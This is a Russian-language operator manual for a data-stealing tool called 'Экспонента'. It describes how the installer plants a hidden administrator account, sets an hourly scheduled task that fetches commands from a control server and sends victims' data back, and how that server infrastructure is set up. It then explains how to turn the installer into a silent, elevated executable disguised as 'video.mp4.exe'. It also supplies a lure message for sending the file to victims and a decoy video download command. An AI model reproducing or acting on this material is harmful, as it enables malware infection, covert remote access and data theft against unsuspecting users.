# ИНСТАЛЛЯЦИЯ СТАЙЛЕРА «ЭКСПОНЕНТА»

В каталоге содержатся основные модули стайлера «Экспонента». Файлы
используются для установки академического варианта стайлера. Файлы
дистрибутива рабочие, предварительно тестировались в бета-версии.

# ПРИНЦИП РАБОТЫ УСТАНОВЩИКА

После инсталляции файлов стайлера в окружении операционной системы
ведомого компьютера Windows появляются следующие переменные:

После инсталляции файлов стайлера в окружении операционной системы
появляются следующие переменные:

  - *Hacker\_User* – имя (логин) учётной записи компьютера-жертвы на
    веб-серверах хозяина, с которых будет управляться стайлер

  - *Hacker\_Pass* – пароль для этой учётной записи. Задаётся, чтобы
    посторонние не имели доступа к данным жертвы на сервере хозяина.
    Внимание\! Пароль храниться в незащищённом виде\! Просто автор не
    нашёл способа безопасного использования хеша и солей в программах
    удалённого доступа.

  - *Hacker\_host3* – доменное имя публичного хоста, котрое
    присваивается ведомому компьютеру одним из сервисов
    DynDNS.

  - *Hacker\_host2* – доменное имя приватного хоста, с которого
    скачиваются в офлайн-режиме команды управления стайлером и
    на который передаются результаты его работы. Также создаётся
    учётная запись с именем MyAdminAccount для возможного удалённого
    подключения к компьютеру, а также добавляется задание для
    текущего пользователя на запуск каждый час файла onsysload, в
    котором расположены текущие команды управления стайлером

  - Hacker\_pref.— префикс URI адреса сервера Hacker\_host2. Для HTTP
    версии стайлера может принимать значение http и https, для FTP
    версии — безальтернативно ftp

  - Hacker\_Port — порт, на котором работает сервер Hacher\_host2. В
    новой версии стайлера порт может быть произвольным и принимать
    значения от 1 до 65535

  - hldnstoken — токен, по которому назначается доменное имя для hldns
    DynDNS сервиса (полностью бесплатного). Этот токен должен вначале
    зарегистрироваться на сервисе.

  - entrydnstoken — токен, по которому назначается доменное имя для
    entrydns DynDNS и DNS сервиса (условно бесплатного). Этот токен
    должен вначале зарегистрироваться на сервисе.

Также появляется файл %PUB1%\_Styler.ini, в котором находятся настройки
публичного хоста или зеркала для скачки и установки (обновлении)
основных файлов стайлера в каталог %PUB1%, и файлы
%PUB1%\_StylerHTTP.bat %PUB1%\_StylerFTP.bat для собственно установки
стайлера.

На приватном хосте создаются аккаунты «хозяина» HTTP сервера с
поддержкой технологии WebDAV и/или публичного FTP сервера.
Набор находящихся в нём программ одинаковый, и представляет собой
все компилированные версии основного модуля стайлера, а также файлы
Install\_Styler\*.bat, install\_Styler.ini, и дополнительные файлы
installHTTP\_Stylerdistrib.bat, installFTP\_Stylerdistrib.bat,
load\_ftpStyler.bat, load\_httpStyler.bat для собственно скачки и
установки пакетов из удалённого репозитория.

# ИСХОДНЫЕ ДАННЫЕ

Для установки стайлера “Экспонента” вам дополнительно потребуется
следующее рабочее окружение:

  - веб\-адрес публичного HTTP хостинга файлов стайлера. Хостинг
    выбирается произвольно, на Ваш вкус. Доменное имя этого
    публичного хостинга указывается в переменной httphost.

  - веб\-адрес анонимного FTP хостинга файлов стайлера. Хостинг
    выбирается произвольно, на Ваш вкус. Доменное имя этого
    публичного хостинга указывается в переменной ftphost.

  - путь к основной папке с файлами плагинов стайлера на веб-сервере. Он
    записывается в переменную httpMainFolder

  - префикс веб-сервера хостинга, записываемый в переменную httppref.
    Может принимать значение http или https

  - порт, на котором работает веб-сервер. Записывается в переменную
    httpport. Его стандартное значение — 80.

  - логин авторизации пользователя на веб-сервере, если веб-сервер не
    публичный. Записывается в переменную httpuser

  - пароль авторизации пользователя на веб-сервере. Записывается в
    переменную httppassword.

Примечание. Для публичных серверов эти два значения можно оставить
пустыми

  - порт, на котором работает ftp-сервер. Записывается в переменную
    ftpport. Его стандартное значение — 21.

  - логин авторизации пользователя на ftp-сервере, если ftp-сервер не
    анонимный. Для анонимного сервера значение по-умолчанию
    anonymous. Записывается в переменную ftpuser

  - пароль авторизации пользователя на ftp-сервере. Записывается в
    переменную ftppassword.

  - маска файлов, по которой будут скачиваться программы с ftp сервера.
    По-умолчанию \* (все файлы)

FTP сервер поддерживает иерархию вложенных подкаталогов вплоть до трёх
уровней, что позволяет достаточно комфортно размещать файлы на любом
хостинге. Имя каталога первого уровня записывается в переменную
ftpMainFolder, второго уровня — ftpSubFolder, третьего уровня —
ftpSubFolder1. В каждой переменной может быть только один идентификатор,
однако если папка с данным уровнем вложености отсутствует, её можно
оставить пустой. Соответственно, если нужно забрать файлы из корня
ftp сервера все папки следует указать пустыми. Но это плохая идея… Для
веб-сервера путь к папкам может комбинироваться, например
httpMainFolder=MainFolder/SubFolder/SubFolder1. Для FTP сервера же нужно
использовать три переменные. Это неудобство связано с работой
консольного FTP клиента Windows.

Заметим также, что переменные httppassword и ftppassword не имеют ничего
общего с переменной Hacker\_Pass, а переменные httpuser и ftpuser — с
переменной Hacker\_User. Как говориться, мухи отдельно, суп отдельно…
Также переменные MainFolder, SubFolder и SubFolder1 в файлах стайлера не
должны иметь ничего общего с переменными ftpMainFolder, ftpSubFolder,
ftpSubFolder1, поскольку находящиеся в них файл не имеют ничего общего
друг с другом и предназначены для других целей. Это нужно учитывать
при планировании хостинга стайлера.

Все переменные хранятся в файле install\_Styler.ini, из которого они
беруться скриптами установки и обновления файлов стайлера.

# ОРГАНИЗАЦИЯ СЕРВЕРА Hacker\_host1

На веб-сервере с доменным именем, сохранённой в переменной httpost, в
корне создаётся папка: “Exponenta”. В ней содержится установщик
стайлера. Учтите, что все файлы, расположенные в этом каталоге,
будут скачены с сервера на компьютер жертвы без изменений\! Это
значит, что там будут только универсальные файлы, кроме файла
install\_Styler.ini. Желательно, чтобы эту папку мог проvматривать как
оглавление каталога, поэтому в файле .htaccess должны быть выставлены
соответствующие разрешения.

На FTP-сервере с доменным именем, сохранённой в переменной ftphost, в
корне создаётся символическая ссылка “ExponentaUser” на папку
“Exponenta” на веб-сервере. Для этого на хостинге желательно также
иметь SSH доступ.

Файл, который устанавливает стайлер вместе с плагинами —
Install\_StylerHTTP.bat или Install\_StylerFTP.bat. Пример его кода
приведён в этой папке. Этот файл рабочий, и используется для
локальной установки стайлера путём запуска этого файла из
командной строки с повышенными привилегиями. Для работы этот
файл (в текущей редакции) требует наличие в том же каталоге файлов:

  - ExponentaHTTPStealer.exe и ExponentaFTPStealer.exe с главными
    файлами стайлера. Он получается переименованием основной http
    или ftp сборки стайлера;

  - install\_Styler.ini — файл с описанием переменных для установки.

Это минимальный рабочий набор инсталлятора. Файлы присутствуют в
каталоге Exponenta на сервере в обязательном порядке. Назначение
других дополнительных файлов будет написано ниже.

ВАЖНО\! В зависимости от протокола передачи данных от ведомого
компьютера ведущему (HTTP и FTP) генерируются различные файлы
ExponentaStealer.exe. Оригинальные файлы будут иметь в названии суффикс
HTTP или FTP.

Применительно к серверу Apache, «хозяин» должен дополнительно установить
на сервер модули dav, dav\_fs, поддержки базовой аутентикации, а в
описаниях каталогов этих серверов указать опции “Dav On” и
директивы поддержки базовой аутентикации. Кроме того, создаётся
файл с учётными записями для базовой аутентикации в корневом каталоге
сервера и запрещается к нему доступ со стороны веб-сервера. В
принципе, файлы для создания и конфигурации хостинга на сервере
Zomro указаны в каталоге /Files/Server-Init.

Применительно к серверу Microsoft IIS, «хозяин» должен установить на
сервер дополнительные роли WebDAV, базовой аутентикации и
аутентикации Windows, создаётся учётная запись MyAdminAccount на
сервере хозяина с паролем. После этого настраивается аутентикация и
права на каталоги Private и webdav, указывается для расширений .bat и
.cmd MIME тип text/plain (чтобы файлы нормально скачивались с сервера),
то есть идёт нормальная настройка каталогов Private и webdav для общего
доступа с авторизацией по протоколу WebDAV.

Настройка протокола WebDAV и для сервера Apache, и для сервера Microsoft
IIS хорошо описана в Интернете, в том числе и русскоязычном рунете.
Автор не будет подробно останавливаться на этом. Только отметит,
что никаких дополнительных программ, скриптов и функций для этого,
кроме доступа с авторизацией, не требуется\!

И, естественно, все токены и DNS для доменных имён должны быть
зарегистрированы и делегированы серверам. Домены лучше
покупать на Reg.Ru, а делегировать их на сервера и сторонние
хостинг-площадки можно с помощью условно-бесплатного сервиса
EntryDNS.net.

На сервере Hacker\_host2 в папке /Private обязательно должны
присутствовать файлы:

  - user\_dayly1.bat
  - user\_hourly1.bat
  - user\_onstart1.bat
  - sendfile.cmd

которые собственно управляют работой стайлера. Кстати говоря, лучший
способ временно отключить стайлер от работы, с тем чтобы он не
создавал логи — это удалить эти файлы из каталога. После того, как
эти файлы туда вернутся, стайлер заработает. Также стайлер не будет
работать, если не работает хост Hacker\_host2 или он по каким-то
причинам недоступен.

# СОЗДАНИЕ ДИСТРИБУТИВА ДЛЯ РАСПРОСТРАНЕНИЯ МЕТОДОМ СОЦИАЛЬНОЙ ИНЖЕНЕРИИ

Устанавливать файлы стайлера локально или через удалённый доступ —
хорошая идея, но не со всех сторон. Поскольку пакет для работы
требует Интернет, то и устанавливаться он должен также из Интернета.
Ниже будет рассказано, как подготовить файл для загрузки пакета из
Интернета и сокрытия установки методами социальной инженерии и/или
использования уязвимости Microsoft Windows.

Подготовка установочного файла

Для «нормальной» установки стайлера в этом каталоге присутствуют файлы:

  - load\_ftpStyler.bat — файл, скачивающий и устанавливающий файлы
    дистрибутива стайлера «Экспонента» по FTP протоколу;

  - load\_httpStyler.bat — файл, скачивающий и устанавливающий файлы
    дистрибутива стайлера «Экспонента» по HTTP протоколу;

  - install\_Stylerdistrib.bat — файл, устанавливающий стайлер
    «Экспонента» и локального каталога;

  - install\_Styler.ini — файл с настройками переменных окружения этих
    командных файлов, кастомизированного под конкретный ведомый
    компьютер.

  - Install\_Styler.bat — собственно установщик стайлера.

ПРИМЕЧАНИЕ. В данном дистрибутиве файл распространяется без параметров.
Вы сами должны его заполнить валидными параметрами, исходя из данной
инструкции.

Назначение первых двух файлов — открытие портов для FTP и веб-клиента,
подготовка файла сценария и скачивание дистрибутива этим клиентом, а
также запуск локального установщика стайлера. Информацию для этого
пакетный файл получает из ini файла.

Теперь для запуска процесса инсталляции нужно, поместить файлы

  - load\_ftpStyler.bat
  - load\_httpStyler.bat
  - install\_Stylerdistrib.bat
  - install\_Styler.ini
  - Install\_Styler.bat

в один каталог, и запустить один из трёх первых файлов с повышенными
привилегиями. Вариант, как это сделать на практике, смотри ниже.

## Подготовка файла для пересылки на компьютер жертвы

Подготовленные таким образом файлы устанавливают стайлер произвольной
конфигурации на компьютер жертвы. Для этого запускается файл
load….bat на компьютере жертвы из произвольного каталога, с
повышенными привилегиями выполнения. Всё бы хорошо… Только
переслать файл с таким расширением на компьютер жертвы будет
проблематично, а запустить такой файл с повышенными
привилегиями, в обычных условиях пользователю будет
невозможно. Администратора такой файл насторожит, а лузеры не
умеют запускать командные файлы.

К счастью для хакеров, есть программа для конверсии командных файлов в
исполняемые файлы с расширением \*.exe. Для установки программы
подаётся команда:

choco install –y battoexeconverter

После установки запустите программу, откройте в её редакторе командный
файл, задайте опции конвертирования, конечный каталог, и бинго\! Будет
создан исполняемый файл с той же функциональностью.

Перечислять опции и команды работы этого конвертера автор не будет – это
тема отдельной статьи. Отметим, что файл после конвертации сможет:

1.  Требовать запуска с повышенными привилегиями;

2.  Инкапсулировать в себя как выполняемый командный файл, так и
    дополнительные командные и исполняемые файлы, архивы, видео,
    изображения, необходимые для его работы;

3.  Сменить иконку приложения, отображаемую в Windows и файловых
    менеджерах. Это позволит скрывать факт запуска файла в
    стайлере и поможет файлу установщика стайлера «Экспонента»
    «притвориться», например, изображением или файлом видео;

4.  Передавать указанный файл по ссылкам в социальных сетях или
    мессенджерах, а также электронной почте и других средствах
    обмена сообщениями между пользователями. Здесь принципиальное слово
    «по ссылке», поскольку программы обмена сообщениями не разрешают
    пересылать в теле командные и исполняемые файлы, как раз для
    предотвращения заражения. А переданный по ссылке командный файл
    нельзя ни скачать, ни запустить;

5.  Назначить файлу установщика имя, например, video.mp4.exe. Как
    правило, по умолчанию Microsoft Windows скрывает окончания
    исполняемых файлов. В этом случае, при соблюдении пункта 3, этот
    файл будет похож на файл видео, например, с танцующими свиньями, и
    лузер может просто не заметить подмену. Особенно, если в дополнение
    к стайлеру скачается и покажется видео с танцующими свиньями.

6.  Исполняемые файлы, конвертированные из командных, в зависимости от
    содержимого будут любого размера. В случае малого размера файла не
    предполагает выделения места на диске, и у пользователя или
    администратора создаётся ложное впечатление, что такая
    маленькая команда не принесёт вреда и не содержит в себе
    установщика. Что, на самом деле, не так;

7.  Запускать установку в скрытом режиме, не показывая окна консоли;

8.  Удалять после себя файлы, которые инкапсулированы в этот исполняемый
    файл;

9.  Назначать рабочий каталог для выполнения, в том числе каталог с
    временными файлами. В этом случае обнаружить работу стайлера
    будет ещё труднее.

Таким образом, преобразовав командный файл установщика стайлера в
исполняемый файл, перешлите его жертве по ссылке вместе с
побуждающим текстом: «Ну, ка оцени, какое видео с танцующими
свиньями я откопал\!». По законам социальной инженерии, весьма
вероятно откроет такое видео не только офисный лузер, но и его
коллега – беспечный администратор. Не смотря на предупреждения
отдела охраны и компьютерной безопасности. А нам то и надо\!

А организовать загрузку и запуск видео для «отвода глаз» не трудно.
Например, с помощью команд:

Wget «ссылка на файл с видео» Start «файл видео»

# ПОДГОТОВКА EXE ФАЙЛА ДЛЯ УСТАНОВКИ СТАЙЛЕРА ИЗ ИНТЕРНЕТА

  - Скопируйте все файлы из каталога DEST-STEALER в рабочий каталог.
  - Запустите файл battoexeconverter.
  - Загрузите в него один из файлов: load\_ftpStyler.bat,
    load\_httpStyler.bat, install\_Stylerdistrib.bat.
  - В расположенном справа окне опций исправьте их если потребуется.
    Может потребоваться изменение опций видимости программы при
    запуске, иконки и метаданных программы.
  - Нажмите кнопку “Конвертировать”.
  - Выберите имя и каталог сохранения полученного exe файла.
  - Перешлите файл на ведомый компьютер для установки.

# ПРИЛОЖЕНИЕ

  - Настройка сервиса WebDAV на сервере Apache
    <https://www.8host.com/blog/nastrojka-dostupa-k-apache-cherez-webdav-v-ubuntu-12-04/>
    <http://blog.xsk.in/it/sozdanie-sobstvennogo-webdav-servera/435>
  - Настройка сервиса WebDAV на сервере Microsoft IIS
    <http://winitpro.ru/index.php/2011/12/13/ustanovka-i-nastrojka-webdav-na-iis-v-windows/>
    <https://ithelpblog.pro/2017/11/ustanovka-i-nastroyka-webdav-na-iis-v-windows-7-i-windows-2008-dos/>
  - Настройка MIME на сервере Apache
    <https://www.internet-technologies.ru/articles/ustanovka-i-nastroyka-apache-servera.html>
    <http://xoops.ws/modules/instruction/page.php?id=273>
    <https://helpiks.org/9-23020.html> (текст взят для примера.
    Настройку необходимо произвести, если файлы *.bat и *.cmd
    не скачиваются с сервера Apache (например, в его Windows версии)).
  - Настройка MIME на сервере IIS
    <http://help.1forma.ru/Maintenance/1c_admin_webservice1c_iis.htm>
    <https://infostart.ru/public/275820/> (текст взят для примера. Вам
    необходимо добавить для указанных каталогов расширения .cmd и .bat
    и назначить им типы MIME text/plain по вышеуказанным образцам).
